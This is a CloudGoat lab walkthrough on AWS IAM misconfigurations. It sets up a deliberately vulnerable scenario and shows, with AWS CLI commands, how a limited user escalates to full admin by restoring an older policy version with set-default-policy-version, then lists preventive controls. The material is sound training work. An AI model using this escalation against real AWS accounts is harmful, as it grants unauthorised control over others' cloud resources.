  

# Exploring IAM Misconfigurations

  

In this lab, we will explore IAM Misconfigurations and how they can be exploited. This will help to give an understanding of why it is important to follow the best practices while configuring anything on the cloud.

  

**Set-Up Requirements**

  

1.Linux or Mac OS

  

2.Python 3.6+

  

3.Terraform

```

curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -

sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"

sudo apt-get update && sudo apt-get install terraform

```

4. AWS CLI

```curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"

unzip awscliv2.zip

sudo ./aws/install

```

5.jq

```

apt install jq

```

  

**Creating an AWS Administrator Account**

  

 - Sign Up for an Amazon AWS Account.



  

 - After login, search for Identity & Access Management (IAM).

 ![enter image description here](https://cdn.ttgtmedia.com/rms/onlineimages/SCC_0821_Singh_AWSIAM_SS2.jpg)

 - Click on Create User.




![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*mjKzk569Dtxk8uFTOKZ97g.png)

 - Set a user name and click next.

 - Select attach policies directly -> in the menu below check the box for AdministratorAcess -> next
 -![enter image description here](https://miro.medium.com/v2/resize:fit:828/format:webp/1*szq3t1W49y4GMdgOWdZG8Q.png)

 -  **Review**  all the setting once and click on  **Create User**.

 **Getting Access Key and Secret Access Key**
 - Once the user is created, click on its name.
 - ![enter image description here](https://miro.medium.com/v2/resize:fit:828/format:webp/1*muY2yYSYS6lj6QC0tgJb7A.png)

 - On the user page, switch to the **Security credentials** tab. Scroll down to find a button named **Create access key** and click on it.
 - On the next page , choose Command Line Interface and then click next button
 - Give a description if you want , then click create access key

 - Note down both: Access Key and Secret Access Key

 ![enter image description here](https://miro.medium.com/v2/resize:fit:828/format:webp/1*jKKsgCbmNpREK2KUQqAK-w.png)

**Configuring AWS Profile**

 - After creating the AWS Administrator Account use the following command to configure the AWS profile on your terminal:
```
aws configure --profile cloudgoat #give any profile name
```
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/awsprofile.png)

 -  Check if the user is configured with the AWS access key and Secret Key to the corresponding profile.

```
aws iam get-user --profile cloudgoat
```
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/get-user.png)

**Installing CloudGoat**

   ```
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r ./requirements.txt
```

**Configuring CloudGoat**

-   Configure cloudgoat with the AWS profile, use the following command.

```
./cloudgoat.py config profile

```

-   Whitelist the IP-Address automatically.

```
./cloudgoat.py config whitelist --auto


```

## ****Scenario: IAM Privesc by Rollback****

**What is Privesc?**
--------  
"Privesc" is short for "privilege escalation." It refers to the process of gaining higher levels of access or control within a system or environment than what was initially authorized.
---------------------------------------------
Remember , we are using CloudGoat to create a practice environment for finding vulnerabilities in the system and simulate how a "hacker" might think and act in the real world! This will demonstrate the importance of preventing misconfigurations and highlight the need for following best practices!


**Knowledge Check! 📚**
1.  **AWS IAM user**: An AWS IAM user is an entity with long-term credentials (such as username and password) used to interact with AWS services securely. Users have assigned permissions that determine their access levels to AWS resources.
    
2.  **AWS IAM role**: An AWS IAM role defines a set of permissions to control which actions an AWS service, IAM user, or application can perform within AWS. Roles can be assumed by trusted entities to temporarily obtain these permissions.
   
3. **AWS Policy :** A set of rules that define permissions and access controls for AWS resources. It specifies what actions are allowed or denied on specific AWS services and resources, helping to ensure security and compliance within an AWS environment.
<hr>

**About the Scenario** 🔎

Our goal is to acquire **full admin privileges.**

Starting with a highly-limited IAM user, the attacker is able to review previous IAM policy versions and restore one which allows full admin privileges, resulting in a privilege escalation exploit.

![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/iam_priv.png)

In cloud attacks, hackers often target misconfigurations as entry points to gain access to user accounts. **Once inside, they attempt to escalate their privileges, gaining higher levels of access to resources. Finally, they aim to retrieve, modify, or delete sensitive information, potentially causing significant damage or data breaches.** Therefore, maintaining robust security configurations and closely monitoring access controls is crucial for mitigating such risks.
<hr>
**Let's Begin!**🚀

**Run the command:** 

 `./cloudgoat.py create iam_privesc_by_rollback`

This will create the  scenario and will add the required resources that are needed to perform this lab and simulate a Cloud Security Attack Scenario.

**Scenario Resources that will be created:**

-   1 IAM User 
    -   5 policy versions
    
-----
-   Configure the AWS Profile for "raynor" using the following command

```
aws configure --profile raynor
```
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/raynor_aws_configure.png)

-   Get the  **username**  of the current AWS profile.

```
aws iam get-user --profile raynor
```

![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/username_raynor.png)

(Quick info: ARN= Amazon Resource Name , a unique identifier assigned to each resource in AWS)


-   List the  **attached**  policies of the raynor user.

```
aws iam list-attached-user-policies --user-name [username] --profile raynor
```
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/userpolicy_raynor.png)

-   View the Current Policy version.

```
aws iam get-policy --policy-arn <generatedARN>/cg-raynor-policy --profile raynor
```

![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/current_policy.png)

-   Check the  **existing**  versions of the policy.

```
aws iam list-policy-versions --policy-arn <generatedARN>/cg-raynor-policy --profile raynor
```

![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/existing_versions.png)
	  
**VERSION 1**
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/v1policy.png)

**Note:** An attacker with the **iam:SetDefaultPolicyVersion** permission may be able to **escalate privileges through existing policy versions** not currently in use. If a policy that they have access to has versions that are not the default, they would be able to **change the default version to any other existing version.**

**VERSION 2** 
![](https://dhiyaneshgeek.github.io/images/cloud/v2policy.png)

**Note:** The above shown policy allows all actions to all resources. This basically grants the **user administrative access** to the AWS account.

**VERSION 3**
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/v3policy.png)

**Note:** From the above image it can be observed that policy whitelists those two (2) IP subnets. 

(**Quick help:** Whitelisting an IP address means explicitly allowing access or permitting communication from that specific IP address while denying access from all other IP addresses.)

**VERSION 4**
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/v4policy.png)

**Note:** This policy allows this action “iam:Get*” to all AWS resources but only allows for a specified time period which has expired.

(**Quick help:**   
The IAM `Get` action is a permission that allows users or roles to retrieve information about AWS resources, such as their configuration, metadata, or settings. It's commonly used for viewing but not modifying resource details, providing a read-only access level.)
<br>

**VERSION 5**
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/v5policy.png)

**Note:** This allows only the following actions: “s3:ListBucket”, “s3:GetObject” and “s3:ListAllMyBuckets”.
<br>
-   Change the Policy Version from  **v1 —> v2**  , because v2 has administrative privilege.

```
aws iam set-default-policy-version --policy-arn <generatedARN>/cg-raynor-policy --version-id <versionID> --profile raynor
```
![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/before_making_changes.png)

  ![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/after_making_changes.png)

-   Confirm the  **Administrative**  Privilege by creating a  **S3 Bucket**.

```
aws s3api create-bucket --bucket [bucket-name] --region us-east-1 --profile raynor
```

![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/s3api_bucket.png)


![enter image description here](https://dhiyaneshgeek.github.io/images/cloud/created_bucket.png)

  
You now have successfully gained admin access 🤯🤯🤯


In this scenario, we exploited a weakness in the IAM (Identity and Access Management) policy management by reviewing previous versions of IAM policies. 

By restoring an older version of the policy that grants full admin privileges, the attacker successfully escalates their privileges, gaining unauthorized access to administrative capabilities within the AWS environment.

To prevent this, we could have implemented stricter controls on IAM policy versioning, such as limiting access to policy modifications, enforcing least privilege principles, and regularly auditing and reviewing policy changes. Additionally, enabling MFA and monitoring IAM activity could have helped detect and mitigate such unauthorized changes more effectively.

